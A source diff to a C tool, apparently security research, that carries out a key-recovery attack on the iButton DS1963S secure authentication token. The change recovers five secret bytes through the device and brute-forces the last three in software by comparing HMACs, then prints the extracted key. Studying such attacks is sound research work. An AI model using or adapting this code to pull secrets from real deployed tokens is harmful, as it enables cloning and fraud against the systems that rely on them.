@@ -3,7 +3,7 @@
  *
  *  A complexity reduction attack to uncover secret #0 on the iButton DS1963S.
  *
- *  -- Ronald Huizer, 2012
+ *  -- Ronald Huizer, 2013
  */
 #include <assert.h>
 #include <stdio.h>
@@ -260,7 +260,7 @@ int brutus_do_one(struct brutus *brute, int num)
 	/* Compare the current hmac with the target one. */
 	if (!memcmp(secret->target_hmac, reply.signature, 20)) {
 		/* We're done. */
-		if (secret->secret_idx++ == 7)
+		if (secret->secret_idx++ == 4)
 			return 0;
 	} else {
 		/* Something went wrong. */
@@ -296,9 +296,27 @@ void brutus_do_secret(struct brutus *brute, int num)
 		exit(EXIT_FAILURE);
 	}
 
+	/* Calculate the remaining 3 bytes in software. */
+	memcpy(&brute->dev.secret_memory[num * 8], secret->secret, 5);
+	for (i = 0; i < 0xFFFFFF; i++) {
+		brute->dev.secret_memory[num * 8 + 5] = (i >>  0) & 0xFF;
+		brute->dev.secret_memory[num * 8 + 6] = (i >>  8) & 0xFF;
+		brute->dev.secret_memory[num * 8 + 7] = (i >> 16) & 0xFF;
+
+		ds1963s_dev_read_auth_page(&brute->dev, num);
+
+		if (!memcmp(secret->target_hmac, &brute->dev.scratchpad[8], 20))
+			break;
+
+		/* We need to erase the scratchpad again, as the device has
+		 * stored the HMAC there.
+		 */
+		memset(brute->dev.scratchpad, 0xFF, 32);
+	}
+
 	printf("Key: ");
 	for (i = 0; i < 8; i++)
-		printf("%.2x", secret->secret[i]);
+		printf("%.2x", brute->dev.secret_memory[num * 8 + i]);
 	printf("\n");
 }
 
